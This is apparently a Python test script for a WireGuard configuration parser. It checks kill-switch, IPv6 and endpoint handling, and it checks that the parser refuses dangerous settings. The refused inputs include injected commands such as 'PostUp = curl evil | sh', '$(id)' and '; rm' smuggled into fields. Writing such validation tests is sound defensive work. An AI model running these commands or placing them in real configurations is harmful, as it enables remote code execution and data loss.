import base64, importlib.machinery, importlib.util, io, os, sys, json, tempfile, contextlib
H = sys.argv[1]
loader = importlib.machinery.SourceFileLoader("helper", H)
spec = importlib.util.spec_from_loader("helper", loader)
h = importlib.util.module_from_spec(spec); loader.exec_module(h)
def key(): return base64.b64encode(os.urandom(32)).decode()
PK, PUB, PSK = key(), key(), key()
ok = 0
def check(cond, msg):
    global ok
    if not cond: print("FAIL:", msg); sys.exit(1)
    ok += 1
def refuses(text, frag):
    try: h.parse_conf(text)
    except h.ConfError as e:
        check(frag.lower() in str(e).lower(), f"refusal '{frag}' got '{e}'"); return
    check(False, f"should refuse ({frag}): {text!r}")

proton = f"""[Interface]
# Key for test
# Bouncing = 0
# NetShield = 1
PrivateKey = {PK}
Address = 10.2.0.2/32, 2a07:b944::2:2/128
DNS = 10.2.0.1, 2a07:b944::2:1

[Peer]
# CH#1
PublicKey = {PUB}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 185.159.157.1:51820
"""
mullvad = "﻿" + f"[Interface]\r\nPrivateKey = {PK}\r\nAddress = 10.64.1.2/32,fc00:bbbb:bbbb:bb01::1:102/128\r\nDNS = 10.64.0.1\r\n\r\n[Peer]\r\nPublicKey = {PUB}\r\nAllowedIPs = 0.0.0.0/0,::0/0\r\nEndpoint = se-got-wg-001.relays.mullvad.net:51820\r\n"
airvpn = f"[Interface]\nAddress = 10.128.1.2/32\nPrivateKey = {PK}\nMTU = 1320\nDNS = 10.128.0.1\n[Peer]\nPublicKey = {PUB}\nPresharedKey = {PSK}\nEndpoint = [2001:db8::1]:1637\nAllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 15\n"
split = f"[Interface]\nPrivateKey = {PK}\nAddress = 192.168.77.2/24\n[Peer]\nPublicKey = {PUB}\nAllowedIPs = 192.168.77.0/24\nEndpoint = 203.0.113.5:51820\n"

for t in (proton, mullvad, airvpn, split):
    h.parse_conf(t); ok += 1
refuses(proton + "PostUp = curl evil | sh\n", "PostUp")
refuses(proton.replace("[Interface]", "[Interface]\npreup = id"), "PreUp")
refuses(proton + "SaveConfig = true\n", "SaveConfig")
refuses(proton.replace("MTU", "X") + "Foo = bar\n", "foo")
refuses(proton.replace(PK, "notakey"), "PrivateKey")
refuses(proton.replace("185.159.157.1:51820", "185.159.157.1"), "Endpoint")
refuses(proton.replace("185.159.157.1:51820", "evil host:51820"), "Endpoint")
refuses(proton.replace("185.159.157.1:51820", "a;b:51820"), "Endpoint")
refuses(proton.replace("10.2.0.1, 2a07", "$(id), 2a07"), "DNS")
refuses(proton.replace("10.2.0.2/32", "10.2.0.2/32 ; rm"), "Address")
refuses("PrivateKey = " + PK + "\n" + proton, "before [Interface]")
refuses(proton + "[Interface]\nPrivateKey = " + PK + "\n", "second [Interface]")
refuses(f"[Interface]\nPrivateKey = {PK}\nAddress = 10.0.0.2/32\n", "no [Peer]")
refuses(proton.replace("PublicKey = " + PUB, ""), "PublicKey")
refuses(proton.replace("[Peer]", "[Server]"), "unknown section")
refuses(proton + "Table = 1; reboot\n", "Table")
refuses(proton.replace("Endpoint", "Endpoint = 1.2.3.4:1\nEndpoint"), "twice")

# rebuilt config, IPv6 off
secs = h.parse_conf(proton)
eps = h.resolve_endpoints(secs, allow_dns=True, cached={}, ipv6=False)
text, dns, search = h.runtime_conf(secs, eps, ipv6=False)
check("2a07" not in text and "::/0" not in text, "IPv6 left in runtime conf")
check(dns == ["10.2.0.1"] and search == [], f"dns {dns} {search}")
check("DNS" not in text and "#" not in text, "DNS/comments in runtime conf")
check(f"PrivateKey = {PK}" in text and "Endpoint = 185.159.157.1:51820" in text and "AllowedIPs = 0.0.0.0/0" in text, text)
check(h.full_tunnel(secs) and not h.full_tunnel(h.parse_conf(split)), "full_tunnel")
# IPv6 on keeps it
text6, dns6, _ = h.runtime_conf(secs, eps, ipv6=True)
check("::/0" in text6 and "2a07:b944::2:1" in dns6, "ipv6 kept when on")
# IPv6 endpoint with IPv6 off -> refused
try:
    h.resolve_endpoints(h.parse_conf(airvpn), allow_dns=True, cached={}, ipv6=False); check(False, "v6 endpoint accepted")
except h.ConfError as e: check("IPv6" in str(e), str(e))
# host name endpoint: blocked without cache -> refused; with cache -> used; never looked up while blocked
ms = h.parse_conf(mullvad)
try:
    h.resolve_endpoints(ms, allow_dns=False, cached={}, ipv6=False); check(False, "hostname resolved while blocked")
except h.ConfError as e: check("kill switch" in str(e), str(e))
e2 = h.resolve_endpoints(ms, allow_dns=False, cached={PUB: ("193.138.218.1", 51820)}, ipv6=False)
t2, _, _ = h.runtime_conf(ms, e2, ipv6=False)
check("Endpoint = 193.138.218.1:51820" in t2 and "mullvad" not in t2, t2)
# only-IPv6 address with IPv6 off -> refused
v6only = proton.replace("10.2.0.2/32, ", "")
try:
    s6 = h.parse_conf(v6only); h.runtime_conf(s6, h.resolve_endpoints(s6, True, {}, False), ipv6=False); check(False, "v6-only accepted")
except h.ConfError as e: check("IPv6" in str(e), str(e))
# names: fullmatch, no trailing newline
check(h.valid_name("proton-ch1") and not h.valid_name("wg0\n") and not h.valid_name("../x") and not h.valid_name("a"*16), "names")
open(sys.argv[2], "w").write(h.ks_rules("proton-ch1", [("185.159.157.1", 51820)]))
print(f"helper logic: {ok} checks passed")
